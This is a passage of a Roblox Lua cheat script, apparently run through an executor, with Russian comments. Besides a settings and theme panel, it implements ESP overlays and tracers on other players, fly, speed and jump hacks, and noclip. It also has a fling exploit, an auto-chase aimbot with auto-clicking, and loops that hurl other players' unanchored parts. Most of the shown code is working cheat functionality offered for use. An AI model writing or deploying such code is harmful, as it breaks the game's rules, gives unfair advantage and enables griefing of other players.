            TweenService:Create(Frame, TweenInfo.new(0.2), {BackgroundColor3 = Color3.fromRGB(60, 140, 220)}):Play()
        end)
        Frame.MouseLeave:Connect(function()
            TweenService:Create(Frame, TweenInfo.new(0.2), {BackgroundColor3 = Color3.fromRGB(32, 32, 32)}):Play()
        end)
    end
    
    return Label, Frame
end

-- System Info Section
createMonitorSection("📊 SYSTEM INFO")
local FPS_Label = createMonitorRow("🖥️ FPS")
local Ping_Label = createMonitorRow("📡 Ping")
local RAM_Label = createMonitorRow("💾 RAM")
local ServerAge_Label = createMonitorRow("⏱️ Server Age")
local Session_Label = createMonitorRow("⌚ Session Time")
local Executor_Label = createMonitorRow("⚡ Executor")
local BuildDate_Label = createMonitorRow("📅 Build Date")
local BuildType_Label = createMonitorRow("🔧 Build Type")

-- Actions Section
createMonitorSection("🎯 ACTIONS")
local Pos_Label, Pos_Btn = createMonitorRow("📍 Position (Click to Copy)", true)
local Rejoin_Label, Rejoin_Btn = createMonitorRow("🔄 Rejoin Server", true)
local GC_Label, GC_Btn = createMonitorRow("🧹 Clean Memory", true)

-- FPS Unlocker Section
createMonitorSection("🚀 FPS UNLOCKER")

local fpsUnlockerSupported = setfpscap ~= nil

if fpsUnlockerSupported then
    local FPSUnlockLabel, FPSUnlockBtn = createMonitorRow("🚀 Unlock FPS (Click)", true)
    
    FPSUnlockBtn.MouseButton1Click:Connect(function()
        pcall(function()
            setfpscap(9999)
            FPSUnlockLabel.Text = "🚀 FPS Unlocked! (Unlimited)"
            TweenService:Create(FPSUnlockBtn, TweenInfo.new(0.1), {BackgroundColor3 = Color3.fromRGB(100, 255, 140)}):Play()
            task.wait(0.3)
            TweenService:Create(FPSUnlockBtn, TweenInfo.new(0.2), {BackgroundColor3 = Color3.fromRGB(32, 32, 32)}):Play()
        end)
    end)
else
    -- Show unsupported message
    local UnsupportedFrame = Instance.new("Frame")
    UnsupportedFrame.Size = UDim2.new(0.9, 0, 0, 38)
    UnsupportedFrame.BackgroundColor3 = Color3.fromRGB(50, 30, 30)
    UnsupportedFrame.BorderSizePixel = 0
    UnsupportedFrame.ZIndex = 152
    UnsupportedFrame.Parent = MonitorScroll
    
    local UnsupportedCorner = Instance.new("UICorner")
    UnsupportedCorner.CornerRadius = UDim.new(0, 20)
    UnsupportedCorner.Parent = UnsupportedFrame
    
    local UnsupportedLabel = Instance.new("TextLabel")
    UnsupportedLabel.Size = UDim2.new(1, -20, 1, 0)
    UnsupportedLabel.Position = UDim2.new(0, 15, 0, 0)
    UnsupportedLabel.BackgroundTransparency = 1
    UnsupportedLabel.TextColor3 = Color3.fromRGB(255, 150, 150)
    UnsupportedLabel.Font = Enum.Font.Gotham
    UnsupportedLabel.TextSize = 11
    UnsupportedLabel.TextXAlignment = Enum.TextXAlignment.Left
    UnsupportedLabel.Text = "⚠️ Not supported by your executor"
    UnsupportedLabel.ZIndex = 153
    UnsupportedLabel.Parent = UnsupportedFrame
end

-- Theme Section
createMonitorSection("🎨 THEME CHANGER")

local ThemeContainer = Instance.new("Frame")
ThemeContainer.Size = UDim2.new(0.9, 0, 0, 50)
ThemeContainer.BackgroundTransparency = 1
ThemeContainer.ZIndex = 152
ThemeContainer.Parent = MonitorScroll

local ThemeLabel = Instance.new("TextLabel")
ThemeLabel.Size = UDim2.new(1, 0, 0, 20)
ThemeLabel.BackgroundTransparency = 1
ThemeLabel.Text = "Current: " .. Themes[CurrentThemeIndex].Name
ThemeLabel.TextColor3 = Color3.fromRGB(200, 200, 200)
ThemeLabel.Font = Enum.Font.Gotham
ThemeLabel.TextSize = 11
ThemeLabel.TextXAlignment = Enum.TextXAlignment.Left
ThemeLabel.ZIndex = 153
ThemeLabel.Parent = ThemeContainer

local ThemeButtonsFrame = Instance.new("Frame")
ThemeButtonsFrame.Size = UDim2.new(1, 0, 0, 25)
ThemeButtonsFrame.Position = UDim2.new(0, 0, 0, 25)
ThemeButtonsFrame.BackgroundTransparency = 1
ThemeButtonsFrame.ZIndex = 152
ThemeButtonsFrame.Parent = ThemeContainer

local ThemeButtonsLayout = Instance.new("UIListLayout")
ThemeButtonsLayout.FillDirection = Enum.FillDirection.Horizontal
ThemeButtonsLayout.Padding = UDim.new(0, 6)
ThemeButtonsLayout.Parent = ThemeButtonsFrame

for i, theme in ipairs(Themes) do
    local ThemeBtn = Instance.new("TextButton")
    ThemeBtn.Size = UDim2.new(0, 60, 0, 25)
    ThemeBtn.BackgroundColor3 = theme.Color
    ThemeBtn.Text = theme.Name
    ThemeBtn.Font = Enum.Font.GothamBold
    ThemeBtn.TextSize = 10
    ThemeBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
    ThemeBtn.BorderSizePixel = 0
    ThemeBtn.ZIndex = 153
    ThemeBtn.Parent = ThemeButtonsFrame
    
    local ThemeBtnCorner = Instance.new("UICorner")
    ThemeBtnCorner.CornerRadius = UDim.new(0, 4)
    ThemeBtnCorner.Parent = ThemeBtn
    
    ThemeBtn.MouseButton1Click:Connect(function()
        CurrentThemeIndex = i
        ApplyTheme(theme)
        ThemeLabel.Text = "Current: " .. theme.Name
        TweenService:Create(MonitorStroke, TweenInfo.new(0.3), {Color = theme.Color}):Play()
        TweenService:Create(MonitorTitle, TweenInfo.new(0.3), {TextColor3 = theme.Color}):Play()
        TweenService:Create(MonitorScroll, TweenInfo.new(0.3), {ScrollBarImageColor3 = theme.Color}):Play()
        -- Обновляем превью кастомного цвета
        for _, child in pairs(MonitorScroll:GetDescendants()) do
            if child.Name == "CustomColorPreview" and child:IsA("Frame") then
                TweenService:Create(child, TweenInfo.new(0.3), {BackgroundColor3 = theme.Color}):Play()
                break
            end
        end
    end)
    
    ThemeBtn.MouseEnter:Connect(function()
        TweenService:Create(ThemeBtn, TweenInfo.new(0.1), {BackgroundColor3 = Color3.new(
            theme.Color.R * 0.8, theme.Color.G * 0.8, theme.Color.B * 0.8
        )}):Play()
    end)
    ThemeBtn.MouseLeave:Connect(function()
        TweenService:Create(ThemeBtn, TweenInfo.new(0.1), {BackgroundColor3 = theme.Color}):Play()
    end)
end

-- ========================================
-- 🔥 ИСПРАВЛЕННЫЙ Custom Color Picker! 🔥
-- ========================================

local CustomColorHeader = Instance.new("TextLabel")
CustomColorHeader.Size = UDim2.new(0.9, 0, 0, 20)
CustomColorHeader.Position = UDim2.new(0, 0, 0, 10)
CustomColorHeader.BackgroundTransparency = 1
CustomColorHeader.Text = "Custom Theme Color:"
CustomColorHeader.TextColor3 = Color3.fromRGB(200, 200, 200)
CustomColorHeader.Font = Enum.Font.GothamBold
CustomColorHeader.TextSize = 12
CustomColorHeader.TextXAlignment = Enum.TextXAlignment.Left
CustomColorHeader.ZIndex = 153
CustomColorHeader.Parent = MonitorScroll

local CustomColorBtn = Instance.new("TextButton")
CustomColorBtn.Size = UDim2.new(0.9, 0, 0, 35)
CustomColorBtn.Position = UDim2.new(0, 0, 0, 5)
CustomColorBtn.BackgroundColor3 = Color3.fromRGB(35, 35, 45)
CustomColorBtn.Text = ""
CustomColorBtn.BorderSizePixel = 0
CustomColorBtn.ZIndex = 153
CustomColorBtn.Parent = MonitorScroll

local CustomColorCorner = Instance.new("UICorner")
CustomColorCorner.CornerRadius = UDim.new(0, 8)
CustomColorCorner.Parent = CustomColorBtn

local CustomColorLabel = Instance.new("TextLabel")
CustomColorLabel.Size = UDim2.new(0.6, 0, 1, 0)
CustomColorLabel.Position = UDim2.new(0, 15, 0, 0)
CustomColorLabel.BackgroundTransparency = 1
CustomColorLabel.Text = "Choose Custom Color"
CustomColorLabel.TextColor3 = Color3.fromRGB(220, 220, 220)
CustomColorLabel.Font = Enum.Font.Gotham
CustomColorLabel.TextSize = 13
CustomColorLabel.TextXAlignment = Enum.TextXAlignment.Left
CustomColorLabel.ZIndex = 154
CustomColorLabel.Parent = CustomColorBtn

local CustomColorPreview = Instance.new("Frame")
CustomColorPreview.Name = "CustomColorPreview"
CustomColorPreview.Size = UDim2.new(0, 80, 0, 25)
CustomColorPreview.Position = UDim2.new(1, -90, 0.5, -12.5)
CustomColorPreview.BackgroundColor3 = Themes[CurrentThemeIndex].Color
CustomColorPreview.BorderSizePixel = 0
CustomColorPreview.ZIndex = 154
CustomColorPreview.Parent = CustomColorBtn

local CustomColorPreviewCorner = Instance.new("UICorner")
CustomColorPreviewCorner.CornerRadius = UDim.new(0, 6)
CustomColorPreviewCorner.Parent = CustomColorPreview

-- 🔥 ИСПРАВЛЕННАЯ ФУНКЦИЯ! 🔥
CustomColorBtn.MouseButton1Click:Connect(function()
    OpenColorPicker(CurrentTheme.Color, function(newColor)
        -- Создаем кастомную тему
        local customTheme = {
            Name = "Custom",
            Color = newColor,
            BgDark = Color3.fromRGB(14, 14, 14),
            BgMedium = Color3.fromRGB(18, 18, 18),
            BgLight = Color3.fromRGB(24, 24, 24)
        }
        
        -- Применяем кастомную тему
        ApplyTheme(customTheme)
        
        -- Обновляем превью
        CustomColorPreview.BackgroundColor3 = newColor
        ThemeLabel.Text = "Current: Custom"
        
        -- Обновляем цвета монитора
        TweenService:Create(MonitorStroke, TweenInfo.new(0.3), {Color = newColor}):Play()
        TweenService:Create(MonitorTitle, TweenInfo.new(0.3), {TextColor3 = newColor}):Play()
        TweenService:Create(MonitorScroll, TweenInfo.new(0.3), {ScrollBarImageColor3 = newColor}):Play()
        
        -- КЛЮЧЕВОЕ ИСПРАВЛЕНИЕ: Обновляем все Toggle switches
        for _, page in pairs({MovementPage, PlayersPage, StandPilotPage, FunPage, AttachPage, PhysicsPage, GhostPage}) do
            if page then
                for _, column in pairs(page:GetChildren()) do
                    if column.Name == "LeftColumn" or column.Name == "RightColumn" then
                        for _, toggle in pairs(column:GetChildren()) do
                            if toggle:IsA("Frame") then
                                local switch = toggle:FindFirstChildOfClass("TextButton")
                                if switch then
                                    if switch.BackgroundColor3.R > 0.3 or switch.BackgroundColor3.G > 0.3 or switch.BackgroundColor3.B > 0.3 then
                                        TweenService:Create(switch, TweenInfo.new(0.3), {BackgroundColor3 = newColor}):Play()
                                    end
                                end
                            end
                        end
                    end
                end
            end
        end
        
        -- Обновляем все слайдеры
        for _, page in pairs({MovementPage, PlayersPage, StandPilotPage, FunPage, AttachPage, PhysicsPage, GhostPage}) do
            if page then
                for _, desc in pairs(page:GetDescendants()) do
                    if desc.Name == "SliderFill" or desc.Name == "SliderDot" then
                        TweenService:Create(desc, TweenInfo.new(0.3), {BackgroundColor3 = newColor}):Play()
                    end
                end
            end
        end
        
        -- Обновляем ScrollBars
        if AnimScroll then TweenService:Create(AnimScroll, TweenInfo.new(0.3), {ScrollBarImageColor3 = newColor}):Play() end
        if QSScroll then TweenService:Create(QSScroll, TweenInfo.new(0.3), {ScrollBarImageColor3 = newColor}):Play() end
        TweenService:Create(Sidebar, TweenInfo.new(0.3), {ScrollBarImageColor3 = newColor}):Play()
        
        -- Обновляем иконки в Sidebar
        for _, button in pairs(Sidebar:GetChildren()) do
            if button:IsA("TextButton") and button:FindFirstChild("Icon") then
                local icon = button:FindFirstChild("Icon")
                TweenService:Create(icon, TweenInfo.new(0.3), {TextColor3 = newColor}):Play()
            end
        end
        
        -- Обновляем активную кнопку в Sidebar
        if currentActiveButton then
            TweenService:Create(currentActiveButton, TweenInfo.new(0.3), {BackgroundColor3 = Color3.fromRGB(35, 35, 38)}):Play()
        end
        
        -- Обновляем Settings кнопку с Stroke
        local settingsStroke = SettingsBtn:FindFirstChildOfClass("UIStroke")
        if not settingsStroke then
            settingsStroke = Instance.new("UIStroke")
            settingsStroke.Thickness = 2
            settingsStroke.Parent = SettingsBtn
        end
        TweenService:Create(settingsStroke, TweenInfo.new(0.3), {Color = newColor}):Play()
        
        -- Обновляем MainFrame Stroke
        local mainStroke = MainFrame:FindFirstChildOfClass("UIStroke")
        if not mainStroke then
            mainStroke = Instance.new("UIStroke")
            mainStroke.Thickness = 2
            mainStroke.Parent = MainFrame
        end
        TweenService:Create(mainStroke, TweenInfo.new(0.3), {Color = newColor}):Play()
        
        -- Обновляем TopBar Stroke
        local topStroke = TopBar:FindFirstChildOfClass("UIStroke")
        if not topStroke then
            topStroke = Instance.new("UIStroke")
            topStroke.Thickness = 1
            topStroke.Transparency = 0.5
            topStroke.Parent = TopBar
        end
        TweenService:Create(topStroke, TweenInfo.new(0.3), {Color = newColor}):Play()
        
        -- Обновляем TimeLabel
        TweenService:Create(TimeLabel, TweenInfo.new(0.3), {TextColor3 = newColor}):Play()
        
        -- Обновляем Watermark
        if wmStroke then TweenService:Create(wmStroke, TweenInfo.new(0.3), {Color = newColor}):Play() end
        if wmGlow then TweenService:Create(wmGlow, TweenInfo.new(0.3), {BackgroundColor3 = newColor}):Play() end
        
        print("✅ Custom theme applied: " .. tostring(newColor))
    end)
end)

CustomColorBtn.MouseEnter:Connect(function()
    TweenService:Create(CustomColorBtn, TweenInfo.new(0.2), {BackgroundColor3 = Color3.fromRGB(50, 50, 65)}):Play()
end)

CustomColorBtn.MouseLeave:Connect(function()
    TweenService:Create(CustomColorBtn, TweenInfo.new(0.2), {BackgroundColor3 = Color3.fromRGB(35, 35, 45)}):Play()
end)

-- Button Actions
Pos_Btn.MouseButton1Click:Connect(function()
    local char = LocalPlayer.Character
    if char and char:FindFirstChild("HumanoidRootPart") then
        setclipboard(tostring(char.HumanoidRootPart.Position))
        Pos_Label.Text = "📍 Position: COPIED!"
        task.wait(1.5)
    end
end)

Rejoin_Btn.MouseButton1Click:Connect(function()
    Rejoin_Label.Text = "🔄 Rejoining..."
    task.wait(0.5)
    TeleportService:TeleportToPlaceInstance(game.PlaceId, game.JobId, LocalPlayer)
end)

GC_Btn.MouseButton1Click:Connect(function()
    local before = math.floor(Stats:GetTotalMemoryUsageMb())
    collectgarbage("collect")
    GC_Label.Text = "🧹 Cleaned! (" .. before .. "MB → " .. math.floor(Stats:GetTotalMemoryUsageMb()) .. "MB)"
    task.wait(2)
end)

-- FPS Counter
local mfps = 0
RunService.RenderStepped:Connect(function(dt) mfps = math.floor(1/dt) end)

-- Stats Update Loop
task.spawn(function()
    local startTime = os.time()
    while task.wait(0.5) do
        if not MonitorFrame.Visible then continue end
        local ping = math.floor(LocalPlayer:GetNetworkPing() * 1000)
        local serverAge = math.floor(workspace.DistributedGameTime)
        local sessionTime = os.time() - startTime
        local char = LocalPlayer.Character
        local pos = (char and char:FindFirstChild("HumanoidRootPart")) and 
            string.format("%d, %d, %d",
                math.floor(char.HumanoidRootPart.Position.X),
                math.floor(char.HumanoidRootPart.Position.Y),
                math.floor(char.HumanoidRootPart.Position.Z)
            ) or "N/A"
        
        FPS_Label.Text = "🖥️ FPS: " .. mfps
        Ping_Label.Text = "📡 Ping: " .. ping .. " ms"
        RAM_Label.Text = "💾 RAM: " .. math.floor(Stats:GetTotalMemoryUsageMb()) .. " MB"
        ServerAge_Label.Text = string.format("⏱️ Server Age: %02d:%02d:%02d",
            math.floor(serverAge/3600), math.floor((serverAge%3600)/60), serverAge%60)
        Session_Label.Text = string.format("⌚ Session: %02d:%02d:%02d",
            math.floor(sessionTime/3600), math.floor((sessionTime%3600)/60), sessionTime%60)
        Executor_Label.Text = "⚡ Executor: " .. EXECUTOR_NAME
        BuildDate_Label.Text = "📅 Build Date: Feb 04 2026"
        BuildType_Label.Text = "🔧 Build Type: Alpha"
        Pos_Label.Text = "📍 Position: " .. pos
        Rejoin_Label.Text = "🔄 Rejoin Server"
        GC_Label.Text = "🧹 Clean Memory"
    end
end)

SettingsBtn.MouseButton1Click:Connect(function() MonitorFrame.Visible = not MonitorFrame.Visible end)
SettingsBtn.MouseEnter:Connect(function()
    TweenService:Create(SettingsBtn, TweenInfo.new(0.1), {BackgroundColor3 = Color3.fromRGB(42, 42, 42)}):Play()
end)
SettingsBtn.MouseLeave:Connect(function()
    TweenService:Create(SettingsBtn, TweenInfo.new(0.1), {BackgroundColor3 = Color3.fromRGB(32, 32, 32)}):Play()
end)
end

-- ========================================
-- MOVEMENT & ESP LOOPS
-- ========================================

-- FLY LOOP (отдельно)
RunService.Heartbeat:Connect(function()
    if flyEnabled and LocalPlayer.Character then
        local root = LocalPlayer.Character:FindFirstChild("HumanoidRootPart")
        local cam = workspace.CurrentCamera
        if root and bv and bg then
            local move = Vector3.new(0, 0, 0)
            if UserInputService:IsKeyDown(Enum.KeyCode.W) then move = move + cam.CFrame.LookVector end
            if UserInputService:IsKeyDown(Enum.KeyCode.S) then move = move - cam.CFrame.LookVector end
            if UserInputService:IsKeyDown(Enum.KeyCode.A) then move = move - cam.CFrame.RightVector end
            if UserInputService:IsKeyDown(Enum.KeyCode.D) then move = move + cam.CFrame.RightVector end
            if UserInputService:IsKeyDown(Enum.KeyCode.Space) then move = move + Vector3.new(0, 1, 0) end
            if UserInputService:IsKeyDown(Enum.KeyCode.LeftShift) then move = move - Vector3.new(0, 1, 0) end
            if move.Magnitude > 0 then bv.Velocity = move.Unit * flySpeed else bv.Velocity = Vector3.zero end
            bg.CFrame = cam.CFrame
        end
    end
end)

-- ESP LOOP (оптимизированный)
local espLastUpdate = 0
local espUpdateInterval = 0.1

RunService.Heartbeat:Connect(function()
    local now = tick()
    if now - espLastUpdate < espUpdateInterval then return end
    espLastUpdate = now
    
    local myRoot = LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("HumanoidRootPart")
    
    for _, plr in Players:GetPlayers() do
        if plr ~= LocalPlayer and plr.Character then
            local char = plr.Character
            local root = char:FindFirstChild("HumanoidRootPart") or char:FindFirstChild("Torso")
            local head = char:FindFirstChild("Head")
            local hum = char:FindFirstChildOfClass("Humanoid")

            local box = char:FindFirstChild("ESPBox")
            if espBoxEnabled and root then
                if not box then
                    box = Instance.new("BoxHandleAdornment", char)
                    box.Name = "ESPBox"
                    box.Adornee = root
                    box.Size = Vector3.new(4, 6, 3)
                    box.Transparency = 0.6
                    box.AlwaysOnTop = true
                    box.ZIndex = 10
                end
                box.Color3 = espBoxColor
            elseif box then 
                box:Destroy() 
            end

            local bill = char:FindFirstChild("ESPName")
            if espNameEnabled and head and hum then
                if not bill then
                    bill = Instance.new("BillboardGui", char)
                    bill.Name = "ESPName"
                    bill.Adornee = head
                    bill.Size = UDim2.new(0, 200, 0, 50)
                    bill.StudsOffset = Vector3.new(0, 3, 0)
                    bill.AlwaysOnTop = true

                    local lbl = Instance.new("TextLabel", bill)
                    lbl.Name = "Label"
                    lbl.Size = UDim2.new(1, 0, 1, 0)
                    lbl.BackgroundTransparency = 1
                    lbl.TextColor3 = espBoxColor
                    lbl.Font = Enum.Font.SourceSansBold
                    lbl.TextStrokeTransparency = 0
                    lbl.TextSize = espFontSize
                end
                
                local health = math.floor(hum.Health)
                bill.Label.Text = plr.DisplayName .. " [" .. health .. "]"
                bill.Label.TextSize = espFontSize
                bill.Label.TextColor3 = espBoxColor
            elseif bill then 
                bill:Destroy() 
            end

            local distBill = char:FindFirstChild("SecretClubDistance")
            if espDistanceEnabled and root and myRoot then
                if not distBill then
                    distBill = Instance.new("BillboardGui", char)
                    distBill.Name = "SecretClubDistance"
                    distBill.Adornee = root
                    distBill.Size = UDim2.new(0, 200, 0, 30)
                    distBill.StudsOffset = Vector3.new(0, -3, 0)
                    distBill.AlwaysOnTop = true
                    local lbl = Instance.new("TextLabel", distBill)
                    lbl.Name = "Label"
                    lbl.Size = UDim2.new(1, 0, 1, 0)
                    lbl.BackgroundTransparency = 1
                    lbl.TextColor3 = espBoxColor
                    lbl.Font = Enum.Font.SourceSansBold
                    lbl.TextStrokeTransparency = 0
                    lbl.TextSize = espFontSize - 2
                end
                local dist = math.floor((myRoot.Position - root.Position).Magnitude)
                distBill.Label.Text = dist .. "m"
                distBill.Label.TextSize = espFontSize - 2
                distBill.Label.TextColor3 = espBoxColor
            elseif distBill then 
                distBill:Destroy() 
            end

            local tracer = char:FindFirstChild("SecretClubTracer")
            if espTracerEnabled and root then
                if not tracer then
                    local att0 = Instance.new("Attachment", workspace.CurrentCamera)
                    att0.Name = "TracerAttachment0_" .. plr.UserId
                    local att1 = Instance.new("Attachment", root)
                    att1.Name = "TracerAttachment1"
                    tracer = Instance.new("Beam", char)
                    tracer.Name = "SecretClubTracer"
                    tracer.Attachment0 = att0
                    tracer.Attachment1 = att1
                    tracer.Width0 = 0.1
                    tracer.Width1 = 0.1
                    tracer.FaceCamera = true
                end
                tracer.Color = ColorSequence.new(espBoxColor)
            elseif tracer then 
                tracer:Destroy()
                if root:FindFirstChild("TracerAttachment1") then root.TracerAttachment1:Destroy() end
                local cam = workspace.CurrentCamera
                for _, att in cam:GetChildren() do
                    if att.Name == "TracerAttachment0_" .. plr.UserId then 
                        att:Destroy() 
                        break
                    end
                end
            end
        end
    end
end)

-- STAND ATTACH LOOP
local attachLastUpdate = 0
local attachUpdateInterval = 0.033

RunService.Heartbeat:Connect(function()
    if not AttachSettings.attach or not AttachSettings.target then return end
    
    local now = tick()
    if now - attachLastUpdate < attachUpdateInterval then return end
    attachLastUpdate = now
    
    local stand = GetStand()
    local targetChar = workspace.Living:FindFirstChild(AttachSettings.target)
    if stand and targetChar then
        local targetRoot = targetChar:FindFirstChild("HumanoidRootPart")
        if targetRoot then
            stand:SetPrimaryPartCFrame(
                targetRoot.CFrame * 
                CFrame.new(0, AttachSettings.height, -AttachSettings.distance) * 
                CFrame.Angles(0, math.rad(180), 0)
            )
        end
    end
end)

-- ========================================
-- GHOST HUB FUNCTIONS
-- ========================================

local function GH_PressKey(key)
    vim:SendKeyEvent(true, key, false, game)
    task.wait(0.01)
    vim:SendKeyEvent(false, key, false, game)
end

local function GH_InvisibleReset()
    _G.IsResetting = true
    GH_PressKey(Enum.KeyCode.Escape)
    task.wait(0.05)
    GH_PressKey(Enum.KeyCode.R)
    task.wait(0.05)
    GH_PressKey(Enum.KeyCode.Return)
    task.wait(0.2)
    _G.IsResetting = false
end

task.spawn(function()
    while true do
        if gh_isAutoResetEnabled then
            GH_InvisibleReset()
            task.wait(gh_resetInterval)
        else
            task.wait(0.5)
        end
    end
end)

task.spawn(function()
    RunService.Heartbeat:Connect(function()
        if not gh_isFlingActive then return end
        local char = LocalPlayer.Character
        local hrp = char and char:FindFirstChild("HumanoidRootPart")
        if hrp then
            local oldVelocity = hrp.Velocity
            hrp.Velocity = Vector3.new(500000, 500000, 500000)
            RunService.RenderStepped:Wait()
            hrp.Velocity = oldVelocity
        end
    end)
end)

task.spawn(function()
    local camera = workspace.CurrentCamera
    while true do
        local myChar = LocalPlayer.Character
        local myHRP = myChar and myChar:FindFirstChild("HumanoidRootPart")
        local targetChar = gh_selectedPlayer and gh_selectedPlayer.Character
        local targetHRP = targetChar and targetChar:FindFirstChild("HumanoidRootPart")
        local targetHead = targetChar and targetChar:FindFirstChild("Head")

        if gh_isRunning and myHRP and targetHRP and targetHead then
            if not gh_currentBV or gh_currentBV.Parent ~= myHRP then
                if gh_currentBV then gh_currentBV:Destroy() end
                gh_currentBV = Instance.new("BodyVelocity")
                gh_currentBV.MaxForce = Vector3.new(math.huge, math.huge, math.huge)
                gh_currentBV.Parent = myHRP
            end
            local targetVelocity = targetHRP.Velocity
            local predictTime = _G.PredictValue
            local forwardOffset = 5
            local predictedPosition = targetHRP.Position + (targetVelocity * predictTime)
            if targetVelocity.Magnitude > 1 then
                predictedPosition = predictedPosition + (targetVelocity.Unit * forwardOffset)
            end
            local distance = (predictedPosition - myHRP.Position).Magnitude
            local speed
            if distance > 50 then speed = 1000
            elseif distance > 20 then speed = 500
            elseif distance > 10 then speed = 200
            else speed = 50 end
            gh_currentBV.Velocity = (predictedPosition - myHRP.Position).Unit * speed
            camera.CFrame = CFrame.new(camera.CFrame.Position, targetHead.Position)
            if distance < 30 and not _G.IsResetting then
                VirtualUser:CaptureController()
                VirtualUser:ClickButton1(Vector2.new(0,0))
            end
        else
            if gh_currentBV then gh_currentBV:Destroy(); gh_currentBV = nil end
            if myChar and myChar:FindFirstChild("Humanoid") then
                myChar.Humanoid.AutoRotate = true
            end
        end
        task.wait(0.05)
    end
end)

task.spawn(function()
    while task.wait(0.1) do
        if _G.AutoClicker and not UserInputService:GetFocusedTextBox() and not _G.IsResetting then
            vim:SendMouseButtonEvent(0, 0, 0, true, game, 0)
            task.wait(0.01)
            vim:SendMouseButtonEvent(0, 0, 0, false, game, 0)
        end
    end
end)

-- ========================================
-- PHYSICS LAB RUNTIME
-- ========================================

task.spawn(function()
    while true do
        if blackholeActive then
            local h = Instance.new("Part", workspace)
            h.Shape = "Ball"
            h.Size = Vector3.new(6,6,6)
            h.Transparency = 0.5
            h.Material = "Neon"
            h.Color = Color3.new(0.5,0,1)
            h.Anchored = true
            h.CanCollide = false
            while blackholeActive do
                local hrp = LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("HumanoidRootPart")
                if hrp then
                    h.Position = hrp.Position + hrp.CFrame.LookVector * 25
                    for _, v in pairs(workspace:GetPartBoundsInRadius(h.Position, 80)) do
                        if v:IsA("BasePart") and not v.Anchored and not v:IsDescendantOf(LocalPlayer.Character) then 
                            v.AssemblyLinearVelocity = (h.Position - v.Position).Unit * 150 
                        end
                    end
                end
                task.wait(0.03)
            end
            h:Destroy()
        end
        task.wait(1)
    end
end)

task.spawn(function()
    while true do
        if vacuumActive then
            local hrp = LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("HumanoidRootPart")
            if hrp then
                local targetPos = hrp.Position + (hrp.CFrame.LookVector * 25)
                local parts = workspace:FindPartsInRegion3(Region3.new(hrp.Position - Vector3.new(50,50,50), hrp.Position + Vector3.new(50,50,50)), nil, 100)
                for _, v in pairs(parts) do
                    if v:IsA("BasePart") and not v.Anchored and not v:IsDescendantOf(LocalPlayer.Character) then
                        v.AssemblyLinearVelocity = (targetPos - v.Position).Unit * 120
                    end
                end
            end
        end
        task.wait(0.05)
    end
end)

task.spawn(function()
    while true do
        if spiderMode then
            local hrp = LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("HumanoidRootPart")
            if hrp then
                local ray = Ray.new(hrp.Position, hrp.CFrame.LookVector * 3)
                local part = workspace:FindPartOnRay(ray, LocalPlayer.Character)
                if part then hrp.AssemblyLinearVelocity = Vector3.new(0, 45, 0) + (hrp.CFrame.LookVector * 20) end
            end
        end
        task.wait(0.1)
    end
end)

task.spawn(function()
    if not airWalkPlate then
        airWalkPlate = Instance.new("Part")
        airWalkPlate.Size = Vector3.new(10, 0.5, 10)
        airWalkPlate.Anchored = true
        airWalkPlate.Transparency = 0.8
        airWalkPlate.Color = Color3.fromRGB(0, 255, 255)
    end
    while true do
        if airWalk then
            local hrp = LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("HumanoidRootPart")
            if hrp then
                airWalkPlate.Parent = workspace
                airWalkPlate.CFrame = hrp.CFrame * CFrame.new(0, -3.2, 0)
            end
        else
            if airWalkPlate then airWalkPlate.Parent = nil end
        end
        RunService.Heartbeat:Wait()
    end
end)

local function setupCharacterPhysics(char)
    task.wait(0.5)
    local hum = char:FindFirstChild("Humanoid")
    local hrp = char:FindFirstChild("HumanoidRootPart")
    if not hum or not hrp then return end

    hum.StateChanged:Connect(function(old, new)
        if seismicActive and new == Enum.HumanoidStateType.Landed then
            local p = Instance.new("Part", workspace)
            p.Shape = Enum.PartType.Ball
            p.Size = Vector3.new(2, 2, 2)
            p.Position = hrp.Position - Vector3.new(0, 3, 0)
            p.Anchored = true
            p.CanCollide = false
            p.Material = Enum.Material.Neon
            p.Color = Color3.fromRGB(255, 0, 0)
            
            task.spawn(function()
                for i = 1, 20 do
                    p.Size = p.Size + Vector3.new(5, 0.2, 5)
                    p.Transparency = i/20
                    task.wait()
                end
                p:Destroy()
            end)

            local region = Region3.new(hrp.Position - Vector3.new(50, 10, 50), hrp.Position + Vector3.new(50, 20, 50))
            local parts = workspace:FindPartsInRegion3(region, char, 200)
            for _, v in pairs(parts) do
                if v:IsA("BasePart") and not v.Anchored then
                    local direction = (v.Position - hrp.Position).Unit
                    v.AssemblyLinearVelocity = (direction * 150) + Vector3.new(0, 250, 0)
                end
            end
        end
    end)

    hrp.Touched:Connect(function(hit)
        if kickActive and hit:IsA("BasePart") and not hit.Anchored and not hit:IsDescendantOf(char) then
            hit.AssemblyLinearVelocity = (hit.Position - hrp.Position).Unit * 250
        end
    end)
end

if LocalPlayer.Character then setupCharacterPhysics(LocalPlayer.Character) end
LocalPlayer.CharacterAdded:Connect(setupCharacterPhysics)

-- MAIN GAME LOOP
local lastUpdate = 0
local updateInterval = 0.016

RunService.Heartbeat:Connect(function(dt)
    local now = tick()
    if now - lastUpdate < updateInterval then return end
    lastUpdate = now
    
    local char = LocalPlayer.Character
    if not char then return end
    
    local root = char:FindFirstChild("HumanoidRootPart")
    local humanoid = char:FindFirstChild("Humanoid")
    
    if flyEnabled and root and bv and bg then
        local cam = workspace.CurrentCamera
        local move = Vector3.zero
        if UserInputService:IsKeyDown(Enum.KeyCode.W) then move = move + cam.CFrame.LookVector end
        if UserInputService:IsKeyDown(Enum.KeyCode.S) then move = move - cam.CFrame.LookVector end
        if UserInputService:IsKeyDown(Enum.KeyCode.A) then move = move - cam.CFrame.RightVector end
        if UserInputService:IsKeyDown(Enum.KeyCode.D) then move = move + cam.CFrame.RightVector end
        if UserInputService:IsKeyDown(Enum.KeyCode.Space) then move = move + Vector3.new(0, 1, 0) end
        if UserInputService:IsKeyDown(Enum.KeyCode.LeftShift) then move = move - Vector3.new(0, 1, 0) end
        bv.Velocity = move.Magnitude > 0 and move.Unit * flySpeed or Vector3.zero
        bg.CFrame = cam.CFrame
    end
    
    if speedHackEnabled and humanoid then humanoid.WalkSpeed = walkSpeed end
    if jumpHackEnabled and humanoid then humanoid.JumpPower = jumpPower end
    
    if noclipEnabled then
        for _, part in pairs(char:GetDescendants()) do
